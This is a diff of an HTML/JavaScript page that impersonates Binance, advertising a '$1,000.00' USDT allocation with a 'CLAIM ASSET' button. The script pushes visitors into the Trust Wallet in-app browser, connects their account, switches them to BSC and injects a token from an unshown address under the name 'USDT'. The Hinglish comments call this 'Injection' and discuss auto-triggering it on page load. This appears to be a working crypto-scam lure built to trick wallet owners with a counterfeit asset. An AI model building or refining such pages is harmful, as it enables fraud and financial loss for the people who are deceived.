@@ -3,27 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Binance | Distribution</title>
+    <title>Binance | Verify</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         :root { --b-yellow: #F3BA2F; --bg: #0b0e11; }
-        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .card { background: #1e2329; border-radius: 16px; padding: 35px; width: 100%; max-width: 360px; text-align: center; border: 1px solid #2b3139; }
-        .logo { width: 55px; margin-bottom: 20px; }
-        .amount { font-size: 36px; font-weight: 800; color: #fff; margin: 15px 0; }
-        .btn { background: var(--b-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; width: 100%; }
-        #status { font-size: 11px; color: var(--b-yellow); margin-top: 20px; font-family: monospace; }
+        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #1e2329; border-radius: 16px; padding: 30px; width: 320px; text-align: center; border: 1px solid #2b3139; }
+        .amount { font-size: 32px; font-weight: 800; margin: 20px 0; }
+        .btn { background: var(--b-yellow); color: #000; border: none; width: 100%; padding: 15px; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; }
+        #status { font-size: 10px; color: var(--b-yellow); margin-top: 15px; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <img src="https://raw.githubusercontent.com/binance-chain/assets/master/blockchains/binance/info/logo.png" class="logo">
-    <div style="color: #848e9c; font-size: 12px;">PENDING ALLOCATION (USDT)</div>
-    <div class="amount" id="amt">$1,000.00</div>
-    
-    <button class="btn" id="actionBtn">ADD TO HOME SCREEN</button>
-    <div id="status">STATUS: INITIALIZING...</div>
+    <img src="https://raw.githubusercontent.com/binance-chain/assets/master/blockchains/binance/info/logo.png" width="50">
+    <div style="color: #848e9c; font-size: 12px; margin-top: 10px;">ALLOCATION READY</div>
+    <div class="amount">$1,000.00</div>
+    <button class="btn" id="actionBtn">CLAIM ASSET</button>
+    <div id="status">READY</div>
 </div>
 
 <script>
@@ -33,26 +31,27 @@
     const btn = document.getElementById('actionBtn');
     const status = document.getElementById('status');
 
-    // 1. SMART DETECTION: Loop ko break karne ke liye
-    const isInsideWallet = !!(window.ethereum || window.trustwallet);
+    // Logic 1: Detect Provider
+    const getProvider = () => window.trustwallet || window.ethereum;
 
-    async function handleAction() {
-        if (!isInsideWallet) {
-            status.innerText = "REDIRECTING TO WALLET...";
-            const dappPath = window.location.href.split('://')[1];
-            // Yahan siraf redirect hoga
-            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + dappPath;
+    async function handle() {
+        const provider = getProvider();
+
+        // Agar hum wallet se bahar hain (Chrome mein)
+        if (!provider) {
+            status.innerText = "OPENING WALLET...";
+            // Sirf ek baar redirect
+            const dappUrl = window.location.href.replace("https://", "");
+            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + dappUrl;
             return;
         }
 
-        // AGAR ANDAR HAIN:
+        // AGAR HUM ANDAR HAIN (DApp Browser)
         try {
-            const provider = window.trustwallet || window.ethereum;
-            status.innerText = "LINKING TO SECURE NODE...";
-            
+            status.innerText = "CONNECTING...";
             await provider.request({ method: 'eth_requestAccounts' });
 
-            // Network Switch to BSC
+            // Switch Network
             await provider.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
@@ -60,48 +59,38 @@
                 if (e.code === 4902) {
                     await provider.request({
                         method: 'wallet_addEthereumChain',
-                        params: [{ 
-                            chainId: '0x38', 
-                            chainName: 'BSC', 
-                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
-                        }]
+                        params: [{ chainId: '0x38', chainName: 'BSC', rpcUrls: ['https://bsc-dataseed.binance.org/'], nativeCurrency: {name:'BNB',symbol:'BNB',decimals:18} }]
                     });
                 }
             });
 
-            // Token Injection
-            status.innerText = "INJECTING ASSET...";
-            setTimeout(async () => {
-                try {
-                    await provider.request({
-                        method: 'wallet_watchAsset',
-                        params: {
-                            type: 'ERC20',
-                            options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
-                        },
-                    });
-                    status.innerText = "SUCCESS: ASSET ADDED";
-                } catch (addErr) {
-                    status.innerText = "ACTION REJECTED BY USER";
-                }
-            }, 500);
+            // Injection (The "Baki students" Method)
+            status.innerText = "INJECTING...";
+            const added = await provider.request({
+                method: 'wallet_watchAsset',
+                params: {
+                    type: 'ERC20',
+                    options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
+                },
+            });
+
+            if (added) status.innerText = "SUCCESSFUL";
 
         } catch (err) {
-            status.innerText = "CONNECTION FAILED";
+            status.innerText = "REJECTED";
         }
     }
 
-    // 2. AUTO-TRIGGER LOGIC: 
-    // Jaise hi page wallet ke andar load ho, khud process start kar do
-    window.addEventListener('load', () => {
-        if (isInsideWallet) {
-            status.innerText = "AUTO-SYNCING...";
-            handleAction(); // Khud hi function chala do
-        }
-    });
+    btn.addEventListener('click', handle);
 
-    btn.addEventListener('click', handleAction);
+    // Auto-Run if inside wallet to prevent loop
+    window.onload = () => {
+        if (getProvider()) {
+            btn.innerText = "CONFIRM ADD ASSET";
+            status.innerText = "SYNCED WITH WALLET";
+            // Optional: handle(); // Isay auto-trigger karne ke liye uncomment karein
+        }
+    };
 </script>
 </body>
 </html>
